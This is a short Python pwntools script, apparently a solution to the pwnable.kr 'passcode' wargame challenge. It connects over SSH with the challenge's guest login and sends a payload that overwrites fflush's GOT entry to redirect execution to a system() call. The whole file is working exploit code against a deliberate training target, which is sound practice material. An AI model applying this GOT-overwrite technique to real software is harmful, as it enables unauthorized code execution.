#!/usr/bin/python

from pwn import *
p = ssh(host='pwnable.kr',port=2222,user='passcode',password='guest').run('/home/passcode/passcode')
context.log_level = 'debug'

got_fflush = 0x0804a004
system_addr = 0x080485e3

payload = "\x90" * 0x60 + p32(got_fflush) + str(system_addr)

p.sendline(payload)
p.interactive()
